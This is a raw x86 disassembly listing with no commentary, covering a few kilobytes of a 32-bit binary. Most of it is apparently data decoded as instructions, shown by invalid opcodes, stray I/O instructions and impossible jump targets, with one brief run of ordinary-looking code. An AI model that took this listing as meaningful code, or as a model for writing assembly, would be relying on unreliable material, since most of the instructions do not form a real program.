  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	sub    esp,DWORD PTR [edi-0x19]
  40bca4:	(bad)  
  40bca5:	cmc    
  40bca6:	scas   eax,DWORD PTR es:[edi]
  40bca7:	ffree  st(3)
  40bca9:	jmp    0x22b5be5b
  40bcae:	cmp    al,0xcf
  40bcb0:	mov    edi,0xd57884af
  40bcb5:	xchg   ecx,eax
  40bcb6:	ret    0x4c04
  40bcb9:	pushf  
  40bcba:	js     0x40bc5f
  40bcbc:	popa   
  40bcbd:	add    BYTE PTR [ecx],bl
  40bcbf:	inc    ebx
  40bcc0:	ja     0x40bd3c
  40bcc2:	loope  0x40bd3a
  40bcc4:	add    edi,DWORD PTR [ebx-0x3b]
  40bcc7:	test   al,0x3c
  40bcc9:	push   edi
  40bcca:	add    ch,BYTE PTR [eax-0x10]
  40bccd:	rcl    ebp,cl
  40bccf:	xor    eax,0x64aa933d
  40bcd4:	daa    
  40bcd5:	imul   esp,DWORD PTR [esi+eax*8+0x2e],0x27
  40bcda:	mov    cl,bh
  40bcdc:	js     0x40bcdb
  40bcde:	adc    bl,BYTE PTR [ebx]
  40bce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bce1:	test   BYTE PTR [ecx],0x1a
  40bce4:	jl     0x40bcaa
  40bce6:	in     eax,dx
  40bce7:	cmp    esi,DWORD PTR [edx]
  40bce9:	adc    ecx,ecx
  40bceb:	aas    
  40bcec:	mov    eax,0xa392da5f
  40bcf1:	ins    BYTE PTR es:[edi],dx
  40bcf2:	scas   eax,DWORD PTR es:[edi]
  40bcf3:	push   ds
  40bcf4:	xchg   DWORD PTR [esi+ecx*2-0x57c84d00],esp
  40bcfb:	(bad)  
  40bcfc:	aaa    
  40bcfd:	popf   
  40bcfe:	push   ss
  40bcff:	push   ss
  40bd00:	and    al,BYTE PTR [edx]
  40bd02:	mov    eax,0x2b5042a4
  40bd07:	fdiv   QWORD PTR cs:[esi+0x529fb466]
  40bd0e:	mov    ebp,0xfa44c154
  40bd13:	(bad)  
  40bd14:	pop    ds
  40bd15:	xor    eax,0xe300fbcd
  40bd1a:	ja     0x40bd34
  40bd1c:	ret    0xe6b6
  40bd1f:	add    BYTE PTR [eax-0x44],0x37
  40bd23:	hlt    
  40bd24:	add    BYTE PTR [ecx-0x7d],cl
  40bd27:	mov    eax,0x91b6ea75
  40bd2c:	jl     0x40bcb7
  40bd2e:	fwait
  40bd2f:	in     al,0x1e
  40bd31:	dec    ebx
  40bd32:	dec    ebx
  40bd33:	dec    eax
  40bd34:	add    DWORD PTR [eax+eiz*2],ecx
  40bd37:	or     al,0xbd
  40bd39:	lods   al,BYTE PTR ds:[esi]
  40bd3a:	icebp  
  40bd3b:	push   ebp
  40bd3c:	add    edi,DWORD PTR cs:0xe7439ead
  40bd43:	js     0x40bcdd
  40bd45:	ss xor ebx,esi
  40bd48:	mov    bh,0xd2
  40bd4a:	cmp    edx,DWORD PTR [ebx]
  40bd4c:	jno    0x40bd4b
  40bd4e:	sti    
  40bd4f:	js     0x40bdb3
  40bd51:	shl    BYTE PTR [ecx],cl
  40bd53:	adc    al,0x4d
  40bd55:	jecxz  0x40bdcc
  40bd57:	fild   DWORD PTR [edx+0x144108bb]
  40bd5d:	xlat   BYTE PTR ds:[ebx]
  40bd5e:	xchg   esi,eax
  40bd5f:	sar    BYTE PTR [edx+0x75040310],0x4d
  40bd66:	and    DWORD PTR [edx+0x49],ecx
  40bd69:	jns    0x40bd89
  40bd6b:	and    eax,0xad094ba6
  40bd70:	shr    BYTE PTR [edi+0x7b],1
  40bd73:	gs xchg edx,eax
  40bd75:	or     al,0xa
  40bd77:	dec    ecx
  40bd78:	pop    edi
  40bd79:	loopne 0x40bd32
  40bd7b:	xchg   esi,eax
  40bd7c:	mov    eax,0xe45b5166
  40bd81:	repnz inc eax
  40bd83:	sahf   
  40bd84:	and    DWORD PTR [ebp-0x7f],esi
  40bd87:	nop
  40bd88:	pop    edi
  40bd89:	and    al,0x32
  40bd8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd8c:	jbe    0x40bda6
  40bd8e:	sti    
  40bd8f:	xlat   BYTE PTR ds:[ebx]
  40bd90:	fimul  DWORD PTR [esi]
  40bd92:	sar    BYTE PTR [ecx+0x591ac0df],0x91
  40bd99:	push   ecx
  40bd9a:	jno    0x40bdfc
  40bd9c:	pop    eax
  40bd9d:	sub    eax,DWORD PTR [edx-0x2c]
  40bda0:	cmp    ah,al
  40bda2:	shl    DWORD PTR ds:0x95c20713,cl
  40bda8:	adc    eax,0xbdcea355
  40bdad:	sub    al,0x77
  40bdaf:	(bad)  
  40bdb0:	push   edx
  40bdb1:	test   DWORD PTR [eax],0xaea4c493
  40bdb7:	xor    al,0xf6
  40bdb9:	scas   eax,DWORD PTR es:[edi]
  40bdba:	mov    dl,0xd
  40bdbc:	in     eax,0x46
  40bdbe:	jecxz  0x40bd97
  40bdc0:	test   al,0x94
  40bdc2:	mov    cs,WORD PTR [edx]
  40bdc4:	jb     0x40bd8c
  40bdc6:	inc    edx
  40bdc7:	jae    0x40bdb4
  40bdc9:	or     al,0xe6
  40bdcb:	push   ss
  40bdcc:	mov    ch,0xa9
  40bdce:	sbb    cl,BYTE PTR [esi+edx*4+0x38]
  40bdd2:	xchg   ebx,eax
  40bdd3:	mov    cl,0x67
  40bdd5:	push   es
  40bdd6:	and    al,0xb2
  40bdd8:	ret    0x641b
  40bddb:	retf   
  40bddc:	mov    al,0x52
  40bdde:	jp     0x40bddf
  40bde0:	aas    
  40bde1:	jne    0x40be37
  40bde3:	mov    WORD PTR [ebp+0x14],gs
  40bde6:	retf   0xf0ee
  40bde9:	and    bh,BYTE PTR [esi+0x32]
  40bdec:	stos   DWORD PTR es:[edi],eax
  40bded:	fistp  DWORD PTR [ebp+0x69]
  40bdf0:	(bad)  
  40bdf1:	loopne 0x40be4d
  40bdf3:	mov    eax,0x228aec39
  40bdf8:	or     BYTE PTR [eax-0x1555ea3a],bl
  40bdfe:	jae    0x40be3a
  40be00:	fdivr  QWORD PTR [edx+ebx*8-0xc828e38]
  40be07:	add    ecx,DWORD PTR [ebx+0x338f2e9]
  40be0d:	mov    edx,0x5c5c87d8
  40be12:	xchg   DWORD PTR [ebx-0x1decfa43],ecx
  40be18:	mov    eax,ds:0xabe4f711
  40be1d:	xlat   BYTE PTR ds:[ebx]
  40be1e:	mov    dl,0xf9
  40be20:	fist   DWORD PTR [ecx+0x648a1f38]
  40be26:	cdq    
  40be27:	inc    ebp
  40be28:	fucom  st(2)
  40be2a:	pop    es
  40be2b:	xor    BYTE PTR [ebx-0x70831c38],dh
  40be31:	lahf   
  40be32:	mov    esi,es
  40be34:	dec    edx
  40be35:	sub    eax,0xc294bce3
  40be3a:	sub    esp,esp
  40be3c:	cmc    
  40be3d:	pop    esp
  40be3e:	sahf   
  40be3f:	jmp    DWORD PTR cs:[edx+0x63becffd]
  40be46:	daa    
  40be47:	mov    ebp,?
  40be49:	iret   
  40be4a:	mov    dl,0x2f
  40be4c:	and    ecx,DWORD PTR [ecx+0x1dc18780]
  40be52:	das    
  40be53:	mov    cl,0x8
  40be55:	int3   
  40be56:	dec    ebp
  40be57:	mov    eax,0xa29d6b8e
  40be5c:	call   0x80ab:0x7d6d9c1f
  40be63:	dec    edx
  40be64:	lahf   
  40be65:	push   edi
  40be66:	mov    bh,0x64
  40be68:	stc    
  40be69:	push   ss
  40be6a:	rcr    BYTE PTR [eax],0x51
  40be6d:	adc    al,0xd2
  40be6f:	icebp  
  40be70:	inc    esp
  40be71:	call   0x96ac:0x201f071b
  40be78:	adc    al,0x27
  40be7a:	jge    0x40be19
  40be7c:	ja     0x40be7a
  40be7e:	leave  
  40be7f:	neg    DWORD PTR [ebp+0x501cea7b]
  40be85:	push   ecx
  40be86:	inc    esp
  40be87:	ins    DWORD PTR es:[edi],dx
  40be88:	or     DWORD PTR [esi+0x30],ebx
  40be8b:	jne    0x40be2f
  40be8d:	jmp    0x40bea7
  40be8f:	lock mov al,ds:0x1ad1ef44
  40be95:	push   esi
  40be96:	mov    dh,dh
  40be98:	stc    
  40be99:	aas    
  40be9a:	gs sub ebx,esi
  40be9d:	xlat   BYTE PTR ds:[ebx]
  40be9e:	sub    eax,0x5a6242e6
  40bea3:	loop   0x40be26
  40bea5:	cwde   
  40bea6:	ror    ebp,cl
  40bea8:	out    0xe1,al
  40beaa:	inc    esi
  40beab:	and    DWORD PTR [esi],ecx
  40bead:	out    0x64,eax
  40beaf:	jp     0x40beb2
  40beb1:	mov    eax,ds:0xf5418f99
  40beb6:	dec    edx
  40beb7:	in     al,0x77
  40beb9:	ds xor al,0x8c
  40bebc:	pop    esp
  40bebd:	mov    bh,0x6d
  40bebf:	rcr    DWORD PTR [eax],0x0
  40bec2:	in     eax,0xc3
  40bec4:	mov    ds:0xe04b9a5f,eax
  40bec9:	fsubr  QWORD PTR [ebx+ecx*1-0x51c0335a]
  40bed0:	dec    eax
  40bed1:	pop    ecx
  40bed2:	mov    cs:0x2644658a,eax
  40bed8:	nop
  40bed9:	inc    esi
  40beda:	int3   
  40bedb:	inc    ecx
  40bedc:	dec    edi
  40bedd:	fisubr DWORD PTR cs:[edx]
  40bee0:	ret    
  40bee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee2:	adc    ecx,edx
  40bee4:	ja     0x40bf26
  40bee6:	cmp    BYTE PTR ds:0x7510854,dh
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x3dc2f031]
  40bf27:	rol    DWORD PTR [eax+0x387e7ef9],0x7c
  40bf2e:	jle    0x40bfae
  40bf30:	ins    BYTE PTR es:[edi],dx
  40bf31:	and    ebp,DWORD PTR [ecx+0x6a27e703]
  40bf37:	xchg   edx,eax
  40bf38:	(bad)  
  40bf39:	fld    QWORD PTR [edx+esi*2-0x188045f6]
  40bf40:	sub    cl,BYTE PTR [ecx-0x4a]
  40bf43:	or     eax,ebp
  40bf45:	(bad)  
  40bf46:	lods   eax,DWORD PTR ds:[esi]
  40bf47:	mov    es,WORD PTR fs:[edi-0xc]
  40bf4b:	add    al,bl
  40bf4d:	mov    esp,0xdb3ed60f
  40bf52:	sub    eax,0x3277ddd7
  40bf57:	push   eax
  40bf58:	mov    cl,0xcd
  40bf5a:	call   DWORD PTR [edi+ecx*2]
  40bf5d:	sbb    edx,eax
  40bf5f:	cmp    DWORD PTR [edi+0x6f1de258],edi
  40bf65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf66:	sbb    esi,DWORD PTR ds:0x7121e69c
  40bf6c:	popa   
  40bf6d:	test   eax,0x20f9d561
  40bf72:	cld    
  40bf73:	div    BYTE PTR ss:[edx-0x5526ee9f]
  40bf7a:	stos   DWORD PTR es:[edi],eax
  40bf7b:	into   
  40bf7c:	cmp    DWORD PTR [ebx],esp
  40bf7e:	pusha  
  40bf7f:	mov    edx,0x17f279e9
  40bf84:	xor    BYTE PTR [edx+0x6905a4e9],cl
  40bf8a:	adc    al,0xf6
  40bf8c:	add    al,ch
  40bf8e:	and    edi,DWORD PTR [edi]
  40bf90:	dec    ebx
  40bf91:	push   edx
  40bf92:	mov    ah,0xd7
  40bf94:	imul   eax,DWORD PTR [ecx-0x6e955b0],0x5d5326ef
  40bf9e:	xor    edi,esp
  40bfa0:	ins    BYTE PTR es:[edi],dx
  40bfa1:	pusha  
  40bfa2:	or     BYTE PTR [edi-0x62223ec7],cl
  40bfa8:	xlat   BYTE PTR ds:[ebx]
  40bfa9:	pop    esp
  40bfaa:	cmp    eax,0x405577f3
  40bfaf:	enter  0x6d23,0xae
  40bfb3:	das    
  40bfb4:	daa    
  40bfb5:	ficomp DWORD PTR [eax+0x571cf5f0]
  40bfbb:	jmp    0xf6c8be59
  40bfc0:	cmp    bh,BYTE PTR [edx+0x300a5358]
  40bfc6:	jp     0x40bf4c
  40bfc8:	stc    
  40bfc9:	retf   0xa886
  40bfcc:	xchg   ebp,eax
  40bfcd:	xor    eax,0xd762fb8d
  40bfd2:	xchg   ecx,eax
  40bfd3:	or     ch,al
  40bfd5:	xor    eax,ebx
  40bfd7:	mov    ds:0xc21f2d09,eax
  40bfdc:	mov    ecx,0xa5d82bc4
  40bfe1:	rcr    esi,cl
  40bfe3:	clc    
  40bfe4:	in     eax,0x6a
  40bfe6:	out    dx,eax
  40bfe7:	push   ebx
  40bfe8:	jle    0x40bf8b
  40bfea:	scas   eax,DWORD PTR es:[edi]
  40bfeb:	lahf   
  40bfec:	icebp  
  40bfed:	mov    bh,ch
  40bfef:	in     eax,0x26
  40bff1:	sub    edx,ebx
  40bff3:	fadd   st,st(4)
  40bff5:	imul   edi,DWORD PTR [edx],0x20
  40bff8:	xchg   edx,eax
  40bff9:	sub    BYTE PTR [esi],ch
  40bffb:	sub    bl,BYTE PTR [ecx+0x470c8a1d]
  40c001:	popa   
  40c002:	out    dx,al
  40c003:	fidiv  WORD PTR [edx-0x7601f6d2]
  40c009:	ss mov ah,0xc
  40c00c:	xor    bl,al
  40c00e:	push   esp
  40c00f:	dec    esi
  40c010:	xchg   BYTE PTR [ebx],al
  40c012:	pop    ecx
  40c013:	xlat   BYTE PTR ds:[ebx]
  40c014:	mov    ?,WORD PTR [ecx]
  40c016:	xlat   BYTE PTR ds:[ebx]
  40c017:	out    0x86,al
  40c019:	add    cl,BYTE PTR [ebx+0x38]
  40c01c:	repnz push edi
  40c01e:	icebp  
  40c01f:	outs   dx,DWORD PTR ds:[esi]
  40c020:	je     0x40c001
  40c022:	push   edi
  40c023:	mov    ebx,0xd39fac09
  40c028:	icebp  
  40c029:	xor    ebp,DWORD PTR [edx+esi*2]
  40c02c:	addr16 jge 0x40c07a
  40c02f:	mov    eax,0x8c4f2f23
  40c034:	push   ss
  40c035:	mov    ebx,0x55aef753
  40c03a:	int    0xf8
  40c03c:	fs pusha 
  40c03e:	jae    0x40bff1
  40c040:	out    dx,al
  40c041:	into   
  40c042:	push   ss
  40c043:	jmp    0x9b42:0x4753e5b0
  40c04a:	aaa    
  40c04b:	or     al,0x42
  40c04d:	pop    ebx
  40c04e:	fs pop edx
  40c050:	loope  0x40c06d
  40c052:	or     bh,0x45
  40c055:	retf   0xf850
  40c058:	stc    
  40c059:	adc    al,dh
  40c05b:	pop    ss
  40c05c:	ret    
  40c05d:	stc    
  40c05e:	mov    ecx,0x43621a86
  40c063:	adc    al,0x9a
  40c065:	leave  
  40c066:	dec    eax
  40c067:	push   ecx
  40c068:	loop   0x40c0da
  40c06a:	data16 and al,0xa6
  40c06d:	cld    
  40c06e:	or     edx,DWORD PTR [ebx+0x3e]
  40c071:	mov    ds:0xd47534d5,al
  40c076:	stos   DWORD PTR es:[edi],eax
  40c077:	fdiv   QWORD PTR [esi-0x55101ab4]
  40c07d:	inc    edi
  40c07e:	sub    eax,0x82854c97
  40c083:	push   0x45
  40c085:	add    al,0x3e
  40c087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c088:	stc    
  40c089:	xchg   edx,eax
  40c08a:	jbe    0x4707f6fb
  40c090:	dec    esi
  40c091:	jge    0x40c0c4
  40c093:	ss nop
  40c095:	push   ss
  40c096:	push   ss
  40c097:	adc    eax,0x51d44416
  40c09c:	push   es
  40c09d:	sar    ch,cl
  40c09f:	ins    BYTE PTR es:[edi],dx
  40c0a0:	out    dx,al
  40c0a1:	jns    0x40c0b9
  40c0a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0a4:	sbb    eax,0xab5c18ad
  40c0a9:	sbb    bh,cl
  40c0ab:	cmc    
  40c0ac:	or     dl,BYTE PTR [edx]
  40c0ae:	cmp    eax,0x237eb469
  40c0b3:	psubsb mm1,mm2
  40c0b6:	mov    bl,0xf0
  40c0b8:	not    DWORD PTR [edi]
  40c0ba:	dec    edi
  40c0bb:	pop    ds
  40c0bc:	mov    BYTE PTR [esi],ah
  40c0be:	mov    dl,0x21
  40c0c0:	sbb    eax,0x25af38c0
  40c0c5:	out    dx,al
  40c0c6:	xchg   ecx,eax
  40c0c7:	jg     0x40c0fc
  40c0c9:	adc    al,0xb1
  40c0cb:	pop    edx
  40c0cc:	jge    0x40c12c
  40c0ce:	cmp    DWORD PTR ds:0x6e187878,edi
  40c0d4:	bnd js 0x40c09e
  40c0d7:	lock or al,0xe4
  40c0da:	sub    eax,0x95fffafa
  40c0df:	adc    BYTE PTR [ebx],0x92
  40c0e2:	fucom  st(1)
  40c0e4:	xor    esp,DWORD PTR [edx+0x68]
  40c0e7:	js     0x40c11f
  40c0e9:	cs mov bh,0x46
  40c0ec:	dec    ebp
  40c0ed:	pop    ebp
  40c0ee:	jns    0x40c14f
  40c0f0:	mov    edx,ebx
  40c0f2:	sbb    DWORD PTR [ebp-0x6597813d],esi
  40c0f8:	ret    
  40c0f9:	mov    WORD PTR [edi+0xd],ss
  40c0fc:	cmp    BYTE PTR [eax+0x68],0x57
  40c100:	or     al,0xac
  40c102:	std    
  40c103:	fldenv [edx-0xe450ba8]
  40c109:	stc    
  40c10a:	pop    ss
  40c10b:	or     eax,0x9372c97c
  40c110:	xchg   ebp,eax
  40c111:	mov    ss,esi
  40c113:	ds cmp al,0xa5
  40c116:	aas    
  40c117:	cld    
  40c118:	mov    ds:0x2ca3004f,al
  40c11d:	ds adc eax,edi
  40c120:	mov    esi,0xb3227d9b
  40c125:	clc    
  40c126:	les    ebp,FWORD PTR [esi-0x28]
  40c129:	push   es
  40c12a:	out    dx,al
  40c12b:	pop    es
  40c12c:	sbb    ebp,esi
  40c12e:	test   eax,0xf3968d57
  40c133:	into   
  40c134:	outs   dx,BYTE PTR ds:[esi]
  40c135:	mov    cs,WORD PTR [eax+0x44]
  40c138:	or     DWORD PTR [esi+0x43d87c8c],ecx
  40c13e:	jno    0x40c0c0
  40c140:	lods   eax,DWORD PTR ds:[esi]
  40c141:	mov    eax,ds:0xe299db03
  40c146:	pop    esi
  40c147:	jb     0x40c16a
  40c149:	jne    0x40c0e5
  40c14b:	fcomp  DWORD PTR [edi]
  40c14d:	sub    BYTE PTR [edx+ebx*1+0x4f],dh
  40c151:	nop
  40c152:	and    al,0xef
  40c154:	xchg   ecx,eax
  40c155:	fistp  DWORD PTR [eax-0x47]
  40c158:	pop    ebx
  40c159:	mov    ch,0xd4
  40c15b:	loope  0x40c172
  40c15d:	cld    
  40c15e:	jne    0x40c126
  40c160:	mov    dh,0xf0
  40c162:	mov    ds:0x8516de71,eax
  40c167:	pop    ecx
  40c168:	es ja  0x40c170
  40c16b:	mov    ch,BYTE PTR [edi-0x38]
  40c16e:	or     esi,DWORD PTR [edi-0x2c]
  40c171:	ror    BYTE PTR [ecx],1
  40c173:	and    DWORD PTR es:[edi-0x74b63479],edx
  40c17a:	inc    ebp
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xae
  40c196:	je     0x40c1f3
  40c198:	sti    
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	pop    eax
  40c1a2:	inc    ebp
  40c1a3:	popf   
  40c1a4:	stc    
  40c1a5:	pop    esp
  40c1a6:	sub    esi,ebp
  40c1a8:	retf   
  40c1a9:	xchg   ecx,eax
  40c1aa:	dec    eax
  40c1ab:	mov    ds:0x8e6ff74,al
  40c1b0:	adc    edi,esp
  40c1b2:	sub    al,BYTE PTR [edx+ebp*1+0x5f2d9caa]
  40c1b9:	dec    eax
  40c1ba:	dec    ebp
  40c1bb:	ret    0x63e3
  40c1be:	ja     0x40c172
  40c1c0:	lahf   
  40c1c1:	hlt    
  40c1c2:	inc    ecx
  40c1c3:	(bad)  
  40c1c4:	sar    DWORD PTR [eax-0x1d9bdd31],cl
  40c1ca:	jne    0x40c1a1
  40c1cc:	loopne 0x40c19c
  40c1ce:	test   DWORD PTR [ebx-0x490e20a5],esp
  40c1d4:	ss in  al,0x72
  40c1d7:	outs   dx,DWORD PTR ds:[esi]
  40c1d8:	fsub   QWORD PTR [esi+ecx*8-0x58d4acf]
  40c1df:	sbb    bh,BYTE PTR [ecx-0x7e6f5b8]
  40c1e5:	call   0xb894af15
  40c1ea:	imul   ebx,DWORD PTR [esi+0x7a4a6a3d],0xd8ddb9bb
  40c1f4:	aaa    
  40c1f5:	pop    edi
  40c1f6:	or     ebx,DWORD PTR [ecx]
  40c1f8:	fld    DWORD PTR [edi]
  40c1fa:	cs xchg esi,eax
  40c1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fd:	fsubp  st(4),st
  40c1ff:	jl     0x40c26d
  40c201:	pop    es
  40c202:	aam    0xe1
  40c204:	out    0x32,eax
  40c206:	shl    DWORD PTR [ebx+0x14b90528],1
  40c20c:	out    0x4e,al
  40c20e:	call   0x45d36381
  40c213:	mov    DWORD PTR [edi],esi
  40c215:	dec    ecx
  40c216:	pop    ebp
  40c217:	loop   0x40c21f
  40c219:	pop    edi
  40c21a:	(bad)  
  40c21b:	jmp    0x40c27a
  40c21d:	stos   BYTE PTR es:[edi],al
  40c21e:	leave  
  40c21f:	int3   
  40c220:	fdivr  st,st(6)
  40c222:	ss (bad) 
  40c224:	ss nop
  40c226:	mov    ebx,0x38612a29
  40c22b:	mov    eax,ss
  40c22d:	cli    
  40c22e:	jns    0x40c247
  40c230:	icebp  
  40c231:	popf   
  40c232:	adc    BYTE PTR [esi-0x25],dl
  40c235:	pusha  
  40c236:	mov    bl,0xc1
  40c238:	jo     0x40c25e
  40c23a:	popa   
  40c23b:	gs add eax,0xc82cb04c
  40c241:	test   DWORD PTR [ebp+0x21],ebp
  40c244:	add    eax,0x1f5481bc
  40c249:	push   edx
  40c24a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24b:	loope  0x40c2bf
  40c24d:	pushf  
  40c24e:	adc    BYTE PTR [edi],ah
  40c250:	ds push 0x3b
  40c253:	icebp  
  40c254:	push   ds
  40c255:	and    BYTE PTR [ebx+0x12],al
  40c258:	add    al,0x56
  40c25a:	xchg   ebp,eax
  40c25b:	fcomp  DWORD PTR [esi+0x5a6b09c5]
  40c261:	add    cl,cl
  40c263:	mov    dh,0x87
  40c265:	xor    BYTE PTR [esi-0x4e],bl
  40c268:	in     al,0xda
  40c26a:	sub    eax,0xa8065879
  40c26f:	aam    0x54
  40c271:	pop    ebp
  40c272:	int    0x3f
  40c274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c275:	mov    ecx,0x5f57500c
  40c27a:	push   0xcac2153c
  40c27f:	(bad)  
  40c280:	aad    0x0
  40c282:	aam    0xc4
  40c284:	xchg   esi,esp
  40c286:	test   eax,0x47fc5ed0
  40c28b:	retf   0x3622
  40c28e:	imul   eax,DWORD PTR [eax+0x1946b1e4],0xce8a66c4
  40c298:	arpl   bx,dx
  40c29a:	cli    
  40c29b:	les    ebx,FWORD PTR [edi]
  40c29d:	inc    ebp
  40c29e:	pusha  
  40c29f:	cdq    
  40c2a0:	scas   al,BYTE PTR es:[edi]
  40c2a1:	cld    
  40c2a2:	cli    
  40c2a3:	loope  0x40c2c1
  40c2a5:	dec    edx
  40c2a6:	(bad)  
  40c2a8:	aad    0x61
  40c2aa:	push   ds
  40c2ab:	loopne 0x40c23b
  40c2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ae:	dec    ebp
  40c2af:	dec    esi
  40c2b0:	and    esi,DWORD PTR [eax-0x13]
  40c2b3:	out    dx,al
  40c2b4:	dec    ebx
  40c2b5:	dec    BYTE PTR [esi+0x45]
  40c2b8:	stc    
  40c2b9:	xchg   ebx,eax
  40c2ba:	push   ebp
  40c2bb:	sbb    BYTE PTR [edx+0x60f79093],dl
  40c2c1:	inc    edi
  40c2c2:	ja     0x40c2c0
  40c2c4:	xor    eax,0x48cbd5f0
  40c2c9:	or     eax,esp
  40c2cb:	push   0xd01d8373
  40c2d0:	jne    0x40c276
  40c2d2:	xchg   ecx,eax
  40c2d3:	and    BYTE PTR [edi],dh
  40c2d5:	ins    DWORD PTR es:[edi],dx
  40c2d6:	dec    eax
  40c2d7:	sub    eax,0x4aa9123d
  40c2dc:	bound  edx,QWORD PTR [ebp-0x60]
  40c2df:	mov    dh,0xdf
  40c2e1:	loope  0x40c34c
  40c2e3:	mov    BYTE PTR [ecx],dl
  40c2e5:	sub    esi,DWORD PTR [eax]
  40c2e7:	xchg   esp,eax
  40c2e8:	add    DWORD PTR [edx],esp
  40c2ea:	pop    esp
  40c2eb:	rcr    BYTE PTR [eax-0x38],cl
  40c2ee:	(bad)  
  40c2ef:	xchg   edx,eax
  40c2f0:	adc    bh,BYTE PTR [eax]
  40c2f2:	cmp    DWORD PTR [ecx-0x7],edi
  40c2f5:	rol    DWORD PTR [esp+edi*8-0x25],1
  40c2f9:	xchg   esi,eax
  40c2fa:	stos   BYTE PTR es:[edi],al
  40c2fb:	cmp    al,0x45
  40c2fd:	rol    DWORD PTR ds:0xcea7eec0,0x2b
  40c304:	add    DWORD PTR [edi+0x61],0x1d
  40c308:	jecxz  0x40c295
  40c30a:	fucomp st(6)
  40c30c:	or     edi,ecx
  40c30e:	jl     0x40c2d9
  40c310:	aad    0x29
  40c312:	dec    ebp
  40c313:	jge    0x40c2c6
  40c315:	adc    BYTE PTR [esi+0x4c],0x76
  40c319:	push   edx
  40c31a:	nop
  40c31b:	(bad)  
  40c31d:	test   al,0x20
  40c31f:	or     eax,0x144b10f3
  40c324:	mov    ds:0xfb925dd6,eax
  40c329:	(bad)  
  40c32a:	xchg   edi,eax
  40c32b:	imul   esi,DWORD PTR [ebx-0xcbede10],0xfffffff1
  40c332:	ret    0xb850
  40c335:	stc    
  40c336:	lods   eax,DWORD PTR ds:[esi]
  40c337:	ss stos BYTE PTR es:[edi],al
  40c339:	sub    dh,BYTE PTR [eax]
  40c33b:	dec    ebp
  40c33c:	xchg   edi,eax
  40c33d:	ror    BYTE PTR [ebx-0x5e2d057d],1
  40c343:	pop    ecx
  40c344:	dec    edx
  40c345:	add    al,0xd5
  40c347:	add    al,0x8b
  40c349:	mov    DWORD PTR [edx],edx
  40c34b:	mov    edi,0x793d7562
  40c350:	aad    0x78
  40c352:	add    BYTE PTR [edx+0x60],ah
  40c355:	enter  0x97f2,0xf2
  40c359:	dec    esi
  40c35a:	test   eax,0x1d58d008
  40c35f:	rcr    dh,1
  40c361:	push   ebx
  40c362:	jnp    0x40c30a
  40c364:	(bad)  
  40c365:	sbb    eax,0x3359802
  40c36a:	out    dx,eax
  40c36b:	ret    0x3f33
  40c36e:	fwait
  40c36f:	js     0x40c368
  40c371:	fist   DWORD PTR [ebp-0x7bec1d75]
  40c377:	cwde   
  40c378:	push   0xffffff87
  40c37a:	push   edx
  40c37b:	pop    esp
  40c37c:	cs in  eax,dx
  40c37e:	ror    BYTE PTR [ebx+0x357b5393],1
  40c384:	int    0xe9
  40c386:	xchg   esi,eax
  40c387:	in     al,dx
  40c388:	retf   0x4c18
  40c38b:	out    dx,eax
  40c38c:	or     esi,DWORD PTR [edi]
  40c38e:	je     0x40c391
  40c390:	xlat   BYTE PTR ds:[ebx]
  40c391:	fdivr  st(6),st
  40c393:	mov    ebp,0x484db845
  40c398:	cmp    al,BYTE PTR [ebx]
  40c39a:	xor    DWORD PTR ds:0x5beaa53f,0xf184d9f
  40c3a4:	push   ds
  40c3a5:	test   DWORD PTR [edx],ebp
  40c3a7:	cmp    al,0x64
  40c3a9:	xchg   edi,eax
  40c3aa:	ds dec esi
  40c3ac:	std    
  40c3ad:	les    ebp,FWORD PTR [edx]
  40c3af:	add    ecx,edx
  40c3b1:	jns    0x40c3ef
  40c3b3:	lea    ebx,[ebx-0x79]
  40c3b6:	not    eax
  40c3b8:	and    bh,BYTE PTR [ebp+0x6]
  40c3bb:	mov    ds:0x726653cf,eax
  40c3c0:	cs fwait
  40c3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c3:	in     eax,0xea
  40c3c5:	loop   0x40c407
  40c3c7:	dec    ebx
  40c3c8:	icebp  
  40c3c9:	xchg   esi,eax
  40c3ca:	xlat   BYTE PTR ds:[ebx]
  40c3cb:	push   cs
  40c3cc:	int3   
  40c3cd:	arpl   WORD PTR [edi-0x59],bx
  40c3d0:	(bad)  
  40c3d1:	cld    
  40c3d2:	imul   edi,edx,0xffffffa0
  40c3d5:	repnz scas al,BYTE PTR es:[edi]
  40c3d7:	test   DWORD PTR ds:[esi-0x3c83408d],ebp
